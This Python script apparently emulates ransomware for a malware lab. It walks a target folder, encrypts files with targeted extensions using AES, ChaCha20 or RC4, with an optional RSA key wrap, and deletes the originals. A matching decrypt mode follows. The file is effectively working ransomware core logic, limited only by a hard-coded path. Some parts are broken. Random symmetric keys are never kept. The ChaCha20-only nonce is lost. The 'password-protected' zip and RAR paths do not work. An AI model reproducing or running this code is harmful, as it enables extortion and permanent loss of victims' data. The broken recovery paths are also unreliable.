import json
import os
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.primitives import padding
from cryptography.hazmat.primitives.asymmetric import rsa, padding as rsa_padding
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.ciphers.aead import ChaCha20Poly1305
import zipfile
import py7zr
import rarfile
import gzip
import shutil
from cryptography.hazmat.primitives import serialization

# ---
# To decrypt files encrypted with pure symmetric algorithms (AES, RC4, ChaCha20),
# set the keys below as hex strings. For hybrid (RSA) types, no key is needed.
# Example:
# SYMMETRIC_KEYS = {
#     'AES': '00112233445566778899aabbccddeeff00112233445566778899aabbccddeeff',
#     'RC4': '00112233445566778899aabbccddeeff',
#     'ChaCha20': '00112233445566778899aabbccddeeff00112233445566778899aabbccddeeff',
# }
SYMMETRIC_KEYS = {}

def load_ransomware_config():
    with open('ransom.json', 'r') as f:
        return json.load(f)

def list_ransomware_options(config):
    print("\nAvailable Ransomware Options:")
    for idx, ransomware in enumerate(config, 1):
        print(f"{idx}. {ransomware['ransomware']} ({ransomware['enc-algo']})")
    
    choice = int(input("\nSelect ransomware number: ")) - 1
    if 0 <= choice < len(config):
        return config[choice]
    return None

def generate_key(enc_type):
    if "AES" in enc_type:
        return os.urandom(32)  # 256-bit key
    elif "ChaCha20" in enc_type:
        return os.urandom(32)
    elif "RC4" in enc_type:
        return os.urandom(16)
    return None

def aes_encrypt(data, key):
    padder = padding.PKCS7(128).padder()
    padded_data = padder.update(data) + padder.finalize()
    iv = os.urandom(16)
    cipher = Cipher(algorithms.AES(key), modes.CBC(iv))
    encryptor = cipher.encryptor()
    encrypted_data = encryptor.update(padded_data) + encryptor.finalize()
    return iv + encrypted_data

def chacha20_encrypt(data, key, nonce):
    cipher = ChaCha20Poly1305(key)
    encrypted_data = cipher.encrypt(nonce, data, None)
    return encrypted_data

def rc4_encrypt(data, key):
    cipher = Cipher(algorithms.ARC4(key), mode=None)
    encryptor = cipher.encryptor()
    return encryptor.update(data) + encryptor.finalize()

def rsa_encrypt(data, public_key):
    encrypted = public_key.encrypt(
        data,
        rsa_padding.OAEP(
            mgf=rsa_padding.MGF1(algorithm=hashes.SHA256()),
            algorithm=hashes.SHA256(),
            label=None
        )
    )
    return encrypted

def create_password_protected_zip(files, output_path, zip_type, password):
    if zip_type == "7zip":
        with py7zr.SevenZipFile(output_path, 'w', password=password) as archive:
            for file in files:
                archive.write(file, os.path.basename(file))
    
    elif zip_type == "RAR":
        with rarfile.RarFile(output_path, 'w', password=password) as archive:
            for file in files:
                archive.write(file, os.path.basename(file))
    
    elif zip_type == "gzip":
        # Note: gzip doesn't support password protection natively
        with gzip.open(output_path, 'wb') as f:
            for file in files:
                with open(file, 'rb') as src:
                    shutil.copyfileobj(src, f)
    
    elif zip_type == "Standard_zip":
        with zipfile.ZipFile(output_path, 'w', zipfile.ZIP_DEFLATED) as archive:
            for file in files:
                archive.write(file, os.path.basename(file))
                archive.setpassword(password.encode())

def ensure_rsa_keys():
    key_dir = os.path.join(os.path.dirname(__file__), 'keys')
    priv_path = os.path.join(key_dir, 'private_key.pem')
    pub_path = os.path.join(key_dir, 'public_key.pem')
    if not os.path.exists(key_dir):
        os.makedirs(key_dir)
    if os.path.exists(priv_path) and os.path.exists(pub_path):
        with open(priv_path, 'rb') as f:
            private_key = serialization.load_pem_private_key(f.read(), password=None)
        with open(pub_path, 'rb') as f:
            public_key = serialization.load_pem_public_key(f.read())
        return private_key, public_key
    # Generate new key pair
    private_key = rsa.generate_private_key(public_exponent=65537, key_size=2048)
    public_key = private_key.public_key()
    with open(priv_path, 'wb') as f:
        f.write(private_key.private_bytes(
            encoding=serialization.Encoding.PEM,
            format=serialization.PrivateFormat.PKCS8,
            encryption_algorithm=serialization.NoEncryption()
        ))
    with open(pub_path, 'wb') as f:
        f.write(public_key.public_bytes(
            encoding=serialization.Encoding.PEM,
            format=serialization.PublicFormat.SubjectPublicKeyInfo
        ))
    print(f"[INFO] New RSA key pair generated. Private key saved at: {priv_path}")
    return private_key, public_key

def encrypt_and_zip_files(target_dir, ransomware_config):
    enc_type = ransomware_config['enc-type']
    if 'RSA' in enc_type:
        private_key, public_key = ensure_rsa_keys()
    else:
        private_key = public_key = None
    key = generate_key(enc_type)
    target_extensions = ransomware_config['targets']
    files_to_process = []
    
    # Collect files matching target extensions
    for root, _, files in os.walk(target_dir):
        for file in files:
            if any(file.lower().endswith(ext.lower()) for ext in target_extensions):
                files_to_process.append(os.path.join(root, file))
    
    if not files_to_process:
        print("No matching files found!")
        return
    
    # Handle zip cases
    if ransomware_config['zip_type'] != "None":
        zip_password = os.urandom(16).hex()
        zip_path = os.path.join(target_dir, f"encrypted_{ransomware_config['ransomware']}.{ransomware_config['zip_type']}")
        create_password_protected_zip(files_to_process, zip_path, ransomware_config['zip_type'], zip_password)
        print(f"Files zipped with password: {zip_password}")
        return
    
    # Handle encryption cases
    for file_path in files_to_process:
        with open(file_path, 'rb') as f:
            file_data = f.read()
        
        if enc_type == "AES":
            encrypted_data = aes_encrypt(file_data, key)
        elif enc_type == "ChaCha20":
            nonce = os.urandom(12)
            encrypted_data = chacha20_encrypt(file_data, key, nonce)
        elif enc_type == "RC4":
            encrypted_data = rc4_encrypt(file_data, key)
        elif enc_type == "AES + RSA":
            encrypted_data = aes_encrypt(file_data, key)
            encrypted_key = rsa_encrypt(key, public_key)
            encrypted_data = encrypted_key + encrypted_data
        elif enc_type == "ChaCha20 + RSA":
            nonce = os.urandom(12)
            encrypted_data = chacha20_encrypt(file_data, key, nonce)
            encrypted_key = rsa_encrypt(key, public_key)
            encrypted_data = encrypted_key + nonce + encrypted_data
        elif enc_type == "RC4 + RSA":
            encrypted_data = rc4_encrypt(file_data, key)
            encrypted_key = rsa_encrypt(key, public_key)
            encrypted_data = encrypted_key + encrypted_data
        
        # Write encrypted data
        new_file_path = file_path + ransomware_config['extension']
        with open(new_file_path, 'wb') as f:
            f.write(encrypted_data)
        
        # Remove original file
        os.remove(file_path)
    
    print(f"Files encrypted using {ransomware_config['ransomware']} configuration")

def aes_decrypt(encrypted_data, key):
    iv = encrypted_data[:16]
    ciphertext = encrypted_data[16:]
    cipher = Cipher(algorithms.AES(key), modes.CBC(iv))
    decryptor = cipher.decryptor()
    padded_data = decryptor.update(ciphertext) + decryptor.finalize()
    unpadder = padding.PKCS7(128).unpadder()
    data = unpadder.update(padded_data) + unpadder.finalize()
    return data

def chacha20_decrypt(encrypted_data, key, nonce):
    cipher = ChaCha20Poly1305(key)
    return cipher.decrypt(nonce, encrypted_data, None)

def rc4_decrypt(encrypted_data, key):
    cipher = Cipher(algorithms.ARC4(key), mode=None)
    decryptor = cipher.decryptor()
    return decryptor.update(encrypted_data) + decryptor.finalize()

def rsa_decrypt(encrypted_key, private_key):
    return private_key.decrypt(
        encrypted_key,
        rsa_padding.OAEP(
            mgf=rsa_padding.MGF1(algorithm=hashes.SHA256()),
            algorithm=hashes.SHA256(),
            label=None
        )
    )

def decrypt_files(target_dir, config):
    from cryptography.hazmat.primitives import serialization
    key_dir = os.path.join(os.path.dirname(__file__), 'keys')
    priv_path = os.path.join(key_dir, 'private_key.pem')
    # Build extension to config map
    ext_to_config = {r['extension']: r for r in config}
    # Scan for encrypted files
    files_to_process = []
    for root, _, files in os.walk(target_dir):
        for file in files:
            for ext in ext_to_config:
                if file.endswith(ext):
                    files_to_process.append((os.path.join(root, file), ext_to_config[ext]))
    if not files_to_process:
        print("No encrypted files found!")
        return
    # No prompts for keys; use SYMMETRIC_KEYS dict for pure symmetric types
    privkey_loaded = False
    private_key = None
    for file_path, ransomware_config in files_to_process:
        enc_type = ransomware_config['enc-type']
        extension = ransomware_config['extension']
        # Always look for private key in keys subfolder if RSA is used
        if 'RSA' in enc_type:
            if not privkey_loaded:
                if not os.path.exists(priv_path):
                    print(f"[ERROR] Private key not found at {priv_path}. Cannot decrypt.")
                    return
                with open(priv_path, 'rb') as f:
                    private_key = serialization.load_pem_private_key(f.read(), password=None)
                privkey_loaded = True
        else:
            private_key = None
        # Get symmetric key from dict for pure symmetric types
        key = None
        if enc_type in ('AES', 'RC4', 'ChaCha20'):
            key_hex = SYMMETRIC_KEYS.get(enc_type)
            if not key_hex:
                print(f"[ERROR] No symmetric key set for {enc_type}. Set it in SYMMETRIC_KEYS at the top of the file.")
                continue
            key = bytes.fromhex(key_hex)
        with open(file_path, 'rb') as f:
            encrypted_data = f.read()
        if enc_type == "AES":
            data = aes_decrypt(encrypted_data, key)
        elif enc_type == "ChaCha20":
            nonce = encrypted_data[:12]
            ciphertext = encrypted_data[12:]
            data = chacha20_decrypt(ciphertext, key, nonce)
        elif enc_type == "RC4":
            data = rc4_decrypt(encrypted_data, key)
        elif enc_type == "AES + RSA":
            encrypted_key = encrypted_data[:256]
            ciphertext = encrypted_data[256:]
            file_key = rsa_decrypt(encrypted_key, private_key)
            data = aes_decrypt(ciphertext, file_key)
        elif enc_type == "ChaCha20 + RSA":
            encrypted_key = encrypted_data[:256]
            nonce = encrypted_data[256:268]
            ciphertext = encrypted_data[268:]
            file_key = rsa_decrypt(encrypted_key, private_key)
            data = chacha20_decrypt(ciphertext, file_key, nonce)
        elif enc_type == "RC4 + RSA":
            encrypted_key = encrypted_data[:256]
            ciphertext = encrypted_data[256:]
            file_key = rsa_decrypt(encrypted_key, private_key)
            data = rc4_decrypt(ciphertext, file_key)
        else:
            print(f"Unknown encryption type: {enc_type}")
            continue
        # Restore the original extension by removing the ransomware extension
        if file_path.endswith(extension):
            original_file_path = file_path[:-len(extension)]
        else:
            original_file_path = file_path
        with open(original_file_path, 'wb') as f:
            f.write(data)
        os.remove(file_path)
        print(f"Decrypted: {original_file_path}")

def main():
    target_dir = r"D:\Cyber\Malware\MoSer\target"
    if not os.path.exists(target_dir):
        print(f"Target directory {target_dir} does not exist!")
        return
    config = load_ransomware_config()
    print("\n1. Encrypt files\n2. Decrypt files")
    mode = input("Select mode (1/2): ")
    if mode == '1':
        selected_ransomware = list_ransomware_options(config)
        if not selected_ransomware:
            print("Invalid selection!")
            return
        encrypt_and_zip_files(target_dir, selected_ransomware)
    elif mode == '2':
        decrypt_files(target_dir, config)
    else:
        print("Invalid mode!")

if __name__ == "__main__":
    main()